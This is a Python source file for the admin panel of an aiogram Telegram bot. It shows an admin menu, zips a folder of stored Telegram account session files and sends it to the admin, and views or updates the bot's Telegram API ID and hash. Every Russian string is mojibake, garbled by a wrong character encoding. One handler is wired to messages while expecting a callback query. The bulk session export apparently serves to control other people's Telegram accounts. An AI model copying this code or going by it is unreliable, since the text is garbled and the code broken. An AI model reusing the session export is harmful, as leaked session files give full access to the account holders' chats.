from aiogram import Bot, Dispatcher, F, Router
from aiogram.filters import Command, CommandObject
from aiogram.types import *

from utils.misc_func.bot_models import *
from utils.misc_func.otherfunc import *

from keyboards.reply.adminkey import *
from keyboards.inline.admininlinekey import *

from loader import *
import shutil
from data.config import SESSIONS_STORAGE

from states.admin_state import *


@adminRouter.message(Command('admin'))
async def admin_main_page(msg: Message, state: FSM):

	await state.clear()
	
	text = f'''
–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ <b>–ø–∞–Ω–µ–ª—å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞!</b>

<i>–í–æ—Å–ø–æ–ª—å–∑—É–π—Ç–µ—Å—å –∫–Ω–æ–ø–∫–∞–º–∏ –Ω–∏–∂–µ –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –±–æ—Ç–æ–º üëá</i>
'''
	
	return msg.answer(text, reply_markup=kbMainAdmin())



@adminRouter.callback_query(F.data=='cancel_call')
async def cancel_call_page(call: CallbackQuery, state: FSM):

	await state.clear()

	await call.message.delete()

	text = f'''
–î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ <b>–ø–∞–Ω–µ–ª—å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞!</b>

<i>–í–æ—Å–ø–æ–ª—å–∑—É–π—Ç–µ—Å—å –∫–Ω–æ–ø–∫–∞–º–∏ –Ω–∏–∂–µ –¥–ª—è —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –±–æ—Ç–æ–º üëá</i>
'''
	
	await bot.send_message(call.from_user.id, text, reply_markup=kbMainAdmin())


@adminRouter.message(F.text=='üë§ –í—ã–≥—Ä—É–∑–∫–∞')
async def get_accounts_page(msg: Message, state: FSM):

	await msg.answer('‚è≥ –ê—Ä—Ö–∏–≤ —Å–æ–∑–¥–∞–µ—Ç—Å—è...')

	try:
		current_time = datetime.now().strftime('%Y%m%d_%H%M%S')
		ARCHIVE_NAME = f'archive_{current_time}.zip'

		shutil.make_archive(ARCHIVE_NAME.replace('.zip', ''), 'zip', SESSIONS_STORAGE)

		await msg.answer_document(FSInputFile(ARCHIVE_NAME, ARCHIVE_NAME))

	except Exception as e:
		logger.exception(e)
		await msg.answer('ÔøΩÔøΩ –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ –∞—Ä—Ö–∏–≤–∞!')


@adminRouter.message(F.text=='üÜî –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è')
async def setup_bot_page(msg: Message, state: FSM):
	await state.clear()

	settings = await db.get_settings()

	text = f'''
<b>üÜî –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è</b>    
	
–í —ç—Ç–æ–º —Ä–∞–∑–¥–µ–ª–µ –≤—ã –º–æ–∂–µ—Ç–µ –¥–æ–±–∞–≤–∏—Ç—å/—Å–º–µ–Ω–∏—Ç—å API HASH –∏ API ID –¥–ª—è —Ä–∞–±–æ—Ç—ã –∞–∫–∫–∞—É–Ω—Ç–æ–≤
–û—Ñ–∏—Ü–∏–∞–ª—å–Ω—ã–π —Å–∞–π—Ç –≥–¥–µ –º–æ–∂–µ–æ –≤–∑—è—Ç—å API ID –∏ API HASH: my.telegram.org

‚öôÔ∏è –í–∞—à–∞ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –≤—ã–≥–ª–¥—è–∏—Ç —Ç–∞–∫:
<b>API ID:</b> <tg-spoiler>{settings["api_id"] if settings["api_id"] != None else "–æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç"}</tg-spoiler>
<b>API HASH:</b> <tg-spoiler>{settings["api_hash"] if settings["api_hash"] != None else "–æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç"}</tg-spoiler>
'''

	return msg.answer(text, reply_markup=setApiConfigKey)


@adminRouter.message(F.data=='api_hash_id')
async def api_hash_id_page(call: CallbackQuery, state: FSM):
	await state.clear()

	settings = await db.get_settings()

	text = f'''
<b>üÜî –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è</b>    
	
–í —ç—Ç–æ–º —Ä–∞–∑–¥–µ–ª–µ –≤—ã –º–æ–∂–µ—Ç–µ –¥–æ–±–∞–≤–∏—Ç—å/—Å–º–µ–Ω–∏—Ç—å API HASH –∏ API ID –¥–ª—è —Ä–∞–±–æ—Ç—ã –∞–∫–∫–∞—É–Ω—Ç–æ–≤
–û—Ñ–∏—Ü–∏–∞–ª—å–Ω—ã–π —Å–∞–π—Ç –≥–¥–µ –º–æ–∂–µ–æ –≤–∑—è—Ç—å API ID –∏ API HASH: my.telegram.org

‚öôÔ∏è –í–∞—à–∞ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è –≤—ã–≥–ª–¥—è–∏—Ç —Ç–∞–∫:
<b>API ID:</b> <tg-spoiler>{settings["api_id"] if settings["api_id"] != None else "–æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç"}</tg-spoiler>
<b>API HASH:</b> <tg-spoiler>{settings["api_hash"] if settings["api_hash"] != None else "–æ—Ç—Å—É—Ç—Å—Ç–≤—É–µ—Ç"}</tg-spoiler>
'''

	return call.message.edit_text(text, reply_markup=setApiConfigKey)


@adminRouter.callback_query(F.data=='change_api_config')
async def change_api_config_page(call: CallbackQuery, state: FSM):

    text = f'''
<b>üîê –°–º–µ–Ω–∞ API HASH –∏ API_ID</b>

–î–ª—è —Ç–æ–≥–æ —á—Ç–æ –±—ã —Å–º–µ–Ω–∏—Ç—å API HASH –∏ API_ID –æ—Ç—Ä–ø–∞–≤—å—Ç–µ –∏—Ö –≤ —Å–ª–µ–¥—É—â–µ–º —Ñ–æ—Ä–º–∞—Ç–µ –≤ –æ–¥–Ω–æ–º —Å–æ–æ–±—â–µ–Ω–∏–∏:

<code>e0e5b9677beee1f4d92a857d44355948
27856152</code>

–ì–¥–µ –ø–µ—Ä–≤–æ—è —Å—Ç—Ä–æ–∫–∞ ‚Äî API HASH
–í—Ç–æ—Ä–∞—è —Å—Ç—Ä–æ–∫–∞ ‚Äî API ID
'''
    
    await state.set_state(updateApiConfig.api_config)

    return call.message.edit_text(text, reply_markup=backFuncKey('api_hash_id'))


@adminRouter.message(updateApiConfig.api_config)
async def valid_api_config_page(msg: Message, state: FSM):

    try:
        API_HASH, API_ID = str(msg.text.split('\n')[0]), int(msg.text.split('\n')[1])

        valid = await validate_telegram_credentials(API_ID, API_HASH)

        if valid:
            await db.update_api_config(API_ID, API_HASH)
            await state.clear()

            text = f'''
<b>‚úÖ –î–∞–Ω–Ω—ã–µ —É—Å–ø–µ—à–Ω–æ –∏–∑–º–µ–Ω–µ–Ω—ã</b>
'''
            key = backFuncKey('api_hash_id')

            return msg.answer(text, reply_markup=key)

        else:
            raise ValueError("–î–∞–Ω–Ω—ã–µ –Ω–µ –≤–∞–ª–¥–∏–Ω—ã")

    except Exception as e:
        logger.warning(e)
        await state.set_state(updateApiConfig.api_config)

        return msg.reply('‚ö†Ô∏è –ö–∞–∂–µ—Ç—Å—è, –≤—ã –≤–≤–µ–ª–∏ –¥–∞–Ω–Ω—ã–µ –≤ –Ω–µ–≤–µ—Ä–Ω–æ–º —Ñ–æ—Ä–º–∞—Ç–µ, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞:', reply_markup=backFuncKey('api_hash_id'))

